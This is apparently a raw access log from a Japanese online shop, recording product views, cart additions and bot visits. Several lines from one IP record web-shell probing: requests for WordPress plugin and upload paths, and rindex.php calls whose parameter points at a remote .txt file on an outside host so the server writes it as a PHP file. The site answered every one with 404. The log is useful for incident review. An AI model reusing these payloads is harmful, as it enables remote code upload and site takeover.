[2023-06-15 18:09:12,307699] front.INFO  [5b067d27] [6f278815] [NULL] [ProductController:detail:279] - カート追加処理完了 {"product_id":83,"product_class_id":"91","quantity":2}  [POST, /products/detail/83?, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:12,308164] front.INFO  [5b067d27] [6f278815] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [POST, /products/detail/83?, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:12,308652] front.INFO  [5b067d27] [6f278815] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [POST, /products/detail/83?, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:12,380309] front.INFO  [NULL] [f5f90ea8] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /cart, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:12,380951] front.INFO  [5b067d27] [f5f90ea8] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["cart"]  [GET, /cart, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:12,390522] front.INFO  [5b067d27] [f5f90ea8] [NULL] [LogListener:onKernelController:73] - LOGIC START ["cart"]  [GET, /cart, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:12,423733] front.INFO  [5b067d27] [f5f90ea8] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["cart"]  [GET, /cart, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:12,424467] front.INFO  [5b067d27] [f5f90ea8] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["cart"]  [GET, /cart, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:23,945459] front.INFO  [NULL] [9a1bcc15] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/83, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:23,946361] front.INFO  [5b067d27] [9a1bcc15] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/83, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:23,955128] front.INFO  [5b067d27] [9a1bcc15] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/83, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:23,984297] front.INFO  [5b067d27] [9a1bcc15] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/83, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:09:23,984963] front.INFO  [5b067d27] [9a1bcc15] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/83, 126.182.234.41, https://biken-shop-mall.com/products/detail/83, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
[2023-06-15 18:12:49,212855] front.INFO  [NULL] [f9b6d2b2] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/78, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,213526] front.INFO  [NULL] [f9b6d2b2] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/78, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,222225] front.INFO  [064ceef9] [f9b6d2b2] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/78, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,237095] front.INFO  [064ceef9] [f9b6d2b2] [NULL] [LogListener:onKernelException:105] -  [404]  [GET, /products/detail/78, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,238039] front.INFO  [064ceef9] [f9b6d2b2] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/78, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,238465] front.INFO  [064ceef9] [f9b6d2b2] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/78, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,505277] front.INFO  [NULL] [9f961c17] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/76, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,505774] front.INFO  [NULL] [9f961c17] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/76, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,513972] front.INFO  [538678c1] [9f961c17] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/76, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,528127] front.INFO  [538678c1] [9f961c17] [NULL] [LogListener:onKernelException:105] -  [404]  [GET, /products/detail/76, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,528944] front.INFO  [538678c1] [9f961c17] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/76, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,529389] front.INFO  [538678c1] [9f961c17] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/76, 147.92.179.105, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,880521] front.INFO  [NULL] [e5cc8239] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/80, 147.92.179.112, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,881162] front.INFO  [NULL] [e5cc8239] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/80, 147.92.179.112, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,890741] front.INFO  [d61dd9a8] [e5cc8239] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/80, 147.92.179.112, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,919819] front.INFO  [d61dd9a8] [e5cc8239] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/80, 147.92.179.112, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:12:49,920464] front.INFO  [d61dd9a8] [e5cc8239] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/80, 147.92.179.112, NULL, facebookexternalhit/1.1;line-poker/1.0]
[2023-06-15 18:30:28,606681] front.INFO  [NULL] [09da3db0] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /style.php?sig=update&domain=51.79.124.111, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:30:28,608105] front.INFO  [NULL] [09da3db0] [NULL] [LogListener:onKernelException:105] - No route found for "GET /style.php" (from "www.google.com") [404]  [GET, /style.php?sig=update&domain=51.79.124.111, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:30:28,609764] front.INFO  [7b50b5f5] [09da3db0] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /style.php?sig=update&domain=51.79.124.111, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:30:28,610092] front.INFO  [7b50b5f5] [09da3db0] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /style.php?sig=update&domain=51.79.124.111, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:30:29,942953] front.INFO  [NULL] [7e0f5901] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/plugins/task-controller/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:30:29,944441] front.INFO  [NULL] [7e0f5901] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/plugins/task-controller/index.php" (from "www.google.com") [404]  [GET, /wp-content/plugins/task-controller/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:30:29,945874] front.INFO  [b49217a2] [7e0f5901] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/plugins/task-controller/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:30:29,946202] front.INFO  [b49217a2] [7e0f5901] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/plugins/task-controller/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:33:35,602948] front.INFO  [NULL] [da2ed4ce] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/uploads/2020/11/images/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:33:35,604405] front.INFO  [NULL] [da2ed4ce] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/uploads/2020/11/images/index.php" (from "www.google.com") [404]  [GET, /wp-content/uploads/2020/11/images/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:33:35,606062] front.INFO  [92954862] [da2ed4ce] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/uploads/2020/11/images/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:33:35,606394] front.INFO  [92954862] [da2ed4ce] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/uploads/2020/11/images/index.php, 138.2.9.189, www.google.com, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-06-15 18:57:46,862861] front.INFO  [NULL] [adf2f095] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/, 52.146.8.228, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0]
[2023-06-15 18:57:46,864622] front.INFO  [NULL] [adf2f095] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/" [404]  [GET, /wp-content/, 52.146.8.228, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0]
[2023-06-15 18:57:46,866539] front.INFO  [01257020] [adf2f095] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/, 52.146.8.228, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0]
[2023-06-15 18:57:46,866920] front.INFO  [01257020] [adf2f095] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/, 52.146.8.228, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0]
[2023-06-15 19:06:27,012504] front.INFO  [NULL] [a16282ac] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 19:06:27,014015] front.INFO  [NULL] [a16282ac] [NULL] [LogListener:onKernelException:105] - No route found for "GET /rindex.php" [404]  [GET, /rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 19:06:27,016080] front.INFO  [884b5da9] [a16282ac] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 19:06:27,016403] front.INFO  [884b5da9] [a16282ac] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 19:06:29,644021] front.INFO  [NULL] [04847a89] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 19:06:29,645413] front.INFO  [NULL] [04847a89] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/rindex.php" [404]  [GET, /wp-content/rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 19:06:29,647079] front.INFO  [95248f8b] [04847a89] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 19:06:29,647389] front.INFO  [95248f8b] [04847a89] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/rindex.php?action=add&parameter=vzz.php%7Chttp://51.79.124.111/vz.txt, 138.2.9.189, NULL, python-requests/2.27.1]
[2023-06-15 20:03:53,168710] front.INFO  [NULL] [28d2fec5] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /help/tradelaw, 180.200.61.73, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/111.0.5563.101 Mobile/15E148 Safari/604.1]
[2023-06-15 20:03:53,169444] front.INFO  [727d8656] [28d2fec5] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["help_tradelaw"]  [GET, /help/tradelaw, 180.200.61.73, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/111.0.5563.101 Mobile/15E148 Safari/604.1]
[2023-06-15 20:03:53,178456] front.INFO  [727d8656] [28d2fec5] [NULL] [LogListener:onKernelController:73] - LOGIC START ["help_tradelaw"]  [GET, /help/tradelaw, 180.200.61.73, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/111.0.5563.101 Mobile/15E148 Safari/604.1]
[2023-06-15 20:03:53,194621] front.INFO  [727d8656] [28d2fec5] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["help_tradelaw"]  [GET, /help/tradelaw, 180.200.61.73, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/111.0.5563.101 Mobile/15E148 Safari/604.1]
[2023-06-15 20:03:53,195214] front.INFO  [727d8656] [28d2fec5] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["help_tradelaw"]  [GET, /help/tradelaw, 180.200.61.73, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/111.0.5563.101 Mobile/15E148 Safari/604.1]
[2023-06-15 20:19:40,806898] front.INFO  [NULL] [3a9c5860] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0]
[2023-06-15 20:19:40,807309] front.INFO  [NULL] [3a9c5860] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0]
[2023-06-15 20:19:40,815883] front.INFO  [66ac4570] [3a9c5860] [NULL] [LogListener:onKernelController:73] - LOGIC START ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0]
[2023-06-15 20:19:40,836241] front.INFO  [66ac4570] [3a9c5860] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0]
[2023-06-15 20:19:40,836831] front.INFO  [66ac4570] [3a9c5860] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0]
[2023-06-15 20:19:50,239022] front.INFO  [NULL] [57dfc00e] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1]
[2023-06-15 20:19:50,239573] front.INFO  [NULL] [57dfc00e] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1]
[2023-06-15 20:19:50,249000] front.INFO  [b7c67b21] [57dfc00e] [NULL] [LogListener:onKernelController:73] - LOGIC START ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1]
[2023-06-15 20:19:50,270485] front.INFO  [b7c67b21] [57dfc00e] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1]
[2023-06-15 20:19:50,271122] front.INFO  [b7c67b21] [57dfc00e] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1]
[2023-06-15 20:19:58,708457] front.INFO  [NULL] [d3853cbc] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0]
[2023-06-15 20:19:58,708996] front.INFO  [NULL] [d3853cbc] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["homepage"]  [GET, /, 126.121.244.166, NULL, Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0]
